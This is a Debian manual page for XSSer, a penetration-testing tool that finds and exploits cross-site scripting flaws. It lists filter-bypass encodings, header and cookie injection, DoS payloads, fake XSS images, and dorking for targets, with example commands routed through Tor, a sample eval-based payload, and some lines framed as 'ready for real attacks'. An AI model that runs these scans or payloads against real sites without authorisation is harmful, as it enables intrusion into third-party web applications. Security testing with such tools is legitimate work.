.\" Debian manual page, has been forwarded upstream
.TH XSSER "15" "Feb 2011"
.SH NAME
xsser: "the mosquito" (swarm edition!)  \-cross site scripter framework\-
.SH SYNOPSIS
.B xsser
.SH DESCRIPTION
Cross Site "Scripter" is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based aplications.
.PP
It contains several options to try to bypass certain filters, and various special techniques of code injection.
.PP
.SH INSTALL
XSSer runs on many platforms. It requires Python and the following libraries:
.PP
\- python-pycurl - Python bindings to libcurl
\- python-beautifulsoup - error-tolerant HTML parser for Python
\- python-geoip - Python bindings for the GeoIP IP-to-country resolver library
.PP
On Debian-based systems, run: 
.PP
sudo apt-get install python-pycurl python-beautifulsoup python-geoip
.SH OPTIONS AND FEATURES
[\fIUSAGE\fR]
\-./xsser [OPTIONS] [\-u <url> |\-i <file> |\-d <dork>] [\-g <get> |\-p <post> |\-c <crawl>] [Request(s)] [Vector(s)] [Bypasser(s)] [Technique(s)] [Final Injection(s)]
[\fIOPTIONS\fR]
.TP
\fB\-\-version\fR
show program's version number and exit
.TP
\fB\-h\fR, \fB\-\-help\fR
show this help message and exit
.TP
\fB\-v\fR, \fB\-\-verbose\fR
verbose (default: no)
.TP
\fB\-s\fR, 
show advanced statistics output results
.TP
\fB\-\-gtk\fR
launch XSSer GTK Interface
.[\fI*SPECIAL FEATURES*:\fR]
You can choose Vector(s) and Bypasser(s) to inject code with this
extra special features:
.TP
\fB\-\-imx\fR=\IMX\fR
create a false image with XSS code embedded
.TP
\fB\-\-fla\fR=\FLASH\fR
create a false .swf file with XSS code embedded
.[\fI*SELECT TARGET(S)*:\fR] 
At least one of these options has to be specified to set the source to
get target(s) urls from. You need to choose to run XSSer:
.TP
\fB\-u\fR \URL\fR, \fB\-\-url\fR=\URL\fR
Enter target(s) to audit
.TP
\fB\-i\fR=\READFILE\fR
Read target urls from a file
.TP
\fB\-d\fR=\DORK\fR
Process search engine dork results as target urls
.TP
\fB\-\-De\fR=\DORK_ENGINE\fR
Search engine to use for dorking (bing, altavista, 
yahoo, baidu, yandex, youdao, webcrawler, ask, etc. 
See dork.py file to check for available engines)
.[\fI*SELECT TYPE OF HTTP/HTTPS CONNECTION(S)*:\fR] 
These options can be used to specify which parameter(s) we want to use
like payload to inject code.
.PP
\fB\-g\fR=\GET\fR
Enter payload to audit using GET. (ex: '/menu.php?q=')
\fB\-p\fR=\POST\fR
Enter payload to audit using POST. (ex: 'foo=1&bar=')
\fB\-c\fR=\CRAWLING\fR
Number of urls to crawl on target(s): 1-99999
\fB\-\-Cw\fR=\CRAWLER_WIDTH\fR
Deeping level of crawler: 1-5
\fB\-\-Cl\fR
Crawl only local target(s) urls (default TRUE)
.[\fI*CONFIGURE REQUEST(S)*:\fR] 
These options can be used to specify how to connect to target(s)
payload(s). You can select multiple:
.PP
\fB\-\-cookie\fR=\COOKIE\fR
Change your HTTP Cookie header
\fB\-\-user\-agent\fR=\AGENT\fR
Change your HTTP User-Agent header (default SPOOFED)
\fB\-\-referer\fR=\REFERER\fR
Use another HTTP Referer header (default NONE)
\fB\-\-headers\fR=\HEADERS\fR
Extra HTTP headers newline separated
\fB\-\-auth\-type\fR=\ATYPE\fR
HTTP Authentication type (value Basic or Digest)
\fB\-\-auth\-cred\fR=\ACRED\fR
HTTP Authentication credentials (value name:password)
\fB\-\-proxy\fR=\PROXY\fR
Use proxy server (tor: http://localhost:8118)
\fB\-\-timeout\fR=\TIMEOUT\fR
Select your Timeout (default 30)
\fB\-\-delay\fR=\DELAY\fR
Delay in seconds between each HTTP request (default 8)
\fB\-\-threads\fR=\THREADS\fR
Maximum number of concurrent HTTP requests (default 1)
\fB\-\-retries\fR=\RETRIES\fR
Retries when the connection timeouts (default 3)
.[\fI*CHECKER SYSTEMS*:\fR]
This options are usefull to know if your target(s) have some filters
against XSS attacks and-or repeat all code who recieved:
.PP
\fB\-\-hash\fR
send a hash to pre-check if target repeats all content
recieved (usefull to predict 'false positive' results)
\fB\-\-heuristic\fR
launch a heuristic testing to discover who parameters
can be filtered on target(s) code: ;\/<>"'=
.[\fI*SELECT VECTOR(S)*:\fR] 
These options can be used to specify a XSS vector source code to
inject in each payload. Important, if you don't want to try to inject
a common XSS vector, used by default. Choose only one option:
.PP
\fB\-\-payload\fR=\SCRIPT\fR
OWN  \- Insert your XSS construction \-manually\-
\fB\-\-auto\fR
AUTO \- Insert XSSer 'reported' vectors from file
.[\fI*SELECT BYPASSER(S)*:\fR] 
These options can be used to encode selected vector(s) to try to
bypass all possible anti-XSS filters on target(s) code and some IPS
rules, if the target use it. Also, can be combined with other
techniques to provide encoding:
.PP
\fB\-\-Str\fR
Use method String.FromCharCode()
\fB\-\-Une\fR
Use function Unescape()
\fB\-\-Mix\fR
Mix String.FromCharCode() and Unescape()
\fB\-\-Dec\fR
Use Decimal encoding
\fB\-\-Hex\fR
Use Hexadecimal encoding
\fB\-\-Hes\fR
Use Hexadecimal encoding, with semicolons
\fB\-\-Dwo\fR
Encode vectors IP addresses in DWORD
\fB\-\-Doo\fR
Encode vectors IP addresses in Octal
\fB\-\-Cem\fR=\CEM\fR
Try -manually- different Character Encoding mutations
(reverse obfuscation: good) -> (ex: 'Mix,Une,Str,Hex')
.[\fI*SPECIAL TECHNIQUE(S)*:\fR] 
These options can be used to try to inject code using different type
of XSS techniques. You can select multiple:
.PP
\fB\-\-Coo\fR
COO - Cross Site Scripting Cookie injection
\fB\-\-Xsa\fR
XSA - Cross Site Agent Scripting
\fB\-\-Xsr\fR
XSR - Cross Site Referer Scripting
\fB\-\-Dcp\fR
DCP - Data Control Protocol injections
\fB\-\-Dom\fR
DOM - Use Anchor Stealth (DOM shadows!)
.[\fI*SELECT FINAL INJECTION(S)*:\fR] 
These options can be used to specify the final code to inject in
vulnerable target(s). Important, if you want to exploit on-the-wild
your discovered vulnerabilities. Choose only one option:
.PP
\fB\-\-Fp\fR=\FINALPAYLOAD\fR
OWN    - Insert your final code to inject -manually-
\fB\-\-Fr\fR=\FINALREMOTE\fR
REMOTE - Insert your final code to inject -remotelly-
\fB\-\-Dos\fR
DOSs    - XSS Denial of service (server) attack!!
\fB\-\-Dos\fR
DOS    - XSS Denial of service (client) attack!!
\fB\-\-B64\fR
B64    - Base64 code encoding in META tag (rfc2397)
.[\fI*Miscellaneous*:\fR] 
\fB\-\-silent\fR
inhibit console output results
\fB\-\-update\fR
check for XSSer latest stable version
\fB\-\-save\fR
output all results directly to template (XSSlist.dat)
\fB\-\-xml\fR=\FILEXML\fR
output 'positives' to aXML file (--xml filename.xml)
\fB\-\-publish\fR
output 'positives' to Social Networks (identi.ca)
\fB\-\-short\fR=\SHORTURLS\fR
display -final code- shortered (tinyurl, is.gd)
\fB\-\-launch\fR
launch a browser at the end with each XSS discovered
.SH EXAMPLES OF USAGE
* Simple injection from URL:
.PP
$ python XSSer.py \-u "http://host.com"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Simple injection from File, with tor proxy and spoofing HTTP Referer headers:
.PP
$ python XSSer.py \-i "file.txt" \-\-proxy "http://127.0.0.1:8118" \-\-referer "666.666.666.666"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Multiple injections from URL, with automatic payloading, using tor proxy, injecting on payloads character encoding in "Hexadecimal", with verbose output and saving results to file (XSSlist.dat):
.PP
$ python XSSer.py -u "http://host.com" --proxy "http://127.0.0.1:8118" --auto --Hex --verbose -w
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Multiple injections from URL, with automatic payloading, using caracter encoding mutations (first, change payload to hexadecimal; second, change to StringFromCharCode the first encoding; third, reencode to Hexadecimal the second encoding), with HTTP User-Agent spoofed, changing timeout to "20" and using multithreads (5 threads):
.PP
$ python XSSer.py \-u "http://host.com" \-\-auto \-\-Cem "Hex,Str,Hex" \-\-user\-agent "XSSer!!" \-\-timeout "20" \-\-threads "5"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Advance injection from File, payloading your \-own\- payload and using Unescape() character encoding to bypass filters:
.PP
$ python XSSer.py \-i "urls.txt" \-\-payload 'a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);' \-\-Une
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Injection from Dork selecting "duck" engine (XSSer Storm!):
.PP
$ python XSSer.py \-\-De "duck" \-d "search.php?"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Injection from Crawler with deep 3 and 4 pages to see (XSSer Spider!):
.PP
$ python XSSer.py \-c3 \-\-Cw=4 \-u "http://host.com"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Simple injection from URL, using POST, with statistics results:
.PP
$ python XSSer.py \-u "http://host.com" \-p "index.php?target=search&subtarget=top&searchstring=" \-s
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Multiple injections from URL to a parameter sending with GET, using automatic payloading, with IP Octal payloading ofuscation and printering results in a "tinyurl" shortered link (ready for share!):
.PP
$ python XSSer.py \-u "http://host.com" \-g "bs/?q=" \-\-auto \-\-Doo \-\-short tinyurl
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Simple injection from URL, using GET, injecting a vector in Cookie parameter, trying to use a DOM shadow space (no server logging!) and if exists any "hole", applying your manual final payload "malicious" code (ready for real attacks!):
.PP
$ python XSSer.py \-u "http://host.com" \-g "bs/?q=" \-\-Coo \-\-Anchor \-\-Fr="!enter your final injection code here!"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Simple injection from URL, using GET and trying to generate with results a "malicious" shortered link (is.gd) with a valid DoS (Denegation Of Service) browser client payload:
.PP
$ python XSSer.py \-u "http://host.com" \-g "bs/?q=" \-\-Dos \-\-short "is.gd"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Multiple injections to multiple places, extracting targets from a list in a FILE, applying automatic payloading, changing timeout to "20" and using multithreads (5 threads), increasing delay between petitions to 10 seconds, injecting parameters in HTTP USer\-Agent, HTTP Referer and in Cookie parameters, using proxy Tor, with IP Octal ofuscation, with statistics results, in verbose mode and creating shortered links (tinyurl) of any valid injecting payloads found. (real playing mode!):
.PP
$ python XSSer.py \-i "list_of_url_targets.txt" \-\-auto \-\-timeout "20" \-\-threads "5" \-\-delay "10" \-\-Xsa \-\-Xsr \-\-Coo \-\-proxy "http://127.0.0.1:8118" \-\-Doo \-s \-\-verbose \-\-Dos \-\-short "tinyurl"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Injection of user XSS vector directly in a malicious \-fake\- image created "on the wild", and ready to be uploaded.
.PP
$ python XSSer.py \-\-Imx "test.png" --payload "!enter your malicious injection code here!"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Report output 'positives' injections of a dorking search (using "ask" dorker) directly to a XML file.
.PP
$ python XSSer.py \-d "login.php" \-\-De "ask" \-\-xml "security_report_XSSer_Dork_cuil.xml"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Publish output 'positives' injections of a dorking search (using "duck" dorker) directly to http://identi.ca
(federated XSS pentesting botnet)
.PP
$ python XSSer.py \-d "login.php" \-\-De "duck" \-\-publish
.PP
* Examples online:
.PP
- http://identi.ca/xsserbot01
- http://twitter.com/xsserbot01
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Create a .swf movie with XSS code injected
.PP
$ python XSSer.py \-\-imx "name_of_file"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Send a pre\-checking hash to see if target will generate \-false positive\- results
.PP
$ python XSSer.py \-u "host.com" \-\-check
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Multiple fuzzing injections from url, including DCP injections and exploiting our "own" code, spoofed in a shortered link, on positive results founded. XSS real\-time exploiting.
.PP
$ python XSSer.py \-u "host.com" \-\-auto \-\-Dcp \-\-Fp "enter_your_code_here" \-\-short "is.gd"
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Exploiting Base64 code encoding in META tag (rfc2397) in a manual payload of a vulnerable target.
 .PP
$ python XSSer.py \-u "host.com" \-g "vulnerable_path" \-\-payload "valid_vector_injected" \-\-B64
.PP
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\
* Exploiting our "own" \-remote code\- in a payload discovered using fuzzing and launch it in a browser directly
.PP
$ python XSSer.py \-u "host.com" \-g "vulnerable_path" \-\-auto \-\-Fr "my_host/path/code.js" \-\-launch
.PP
.SH CONTRIBUTE
If you want to contribute to XSSer development reporting a bug, providing a patch, commenting on the code base or simply need to find help to run XSSer first refer to the xsser documentation, then surf the xsser mailing list (Xsser\-users@lists.sourceforge.net) online archives and if you still have something to say, do that on the appropriate xsser mailing list. If nobody gets back to you, then drop me an e\-mail (root@lordepsylon.net \- epsylon@riseup.net).
.PP
If you discover any vulnerability in a software using XSSer, please add to the report a link to this site (xsser.sf.net).
.PP
.SH COPYRIGHT
Copyright © 2008 Free Software Foundation, Inc.   License  GPLv3+:  GNU
GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This  is  free  software:  you  are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
.SH SEE ALSO
.BR top (1)
.SH AUTHOR
xsser was written by R.C.Mérida (psy).
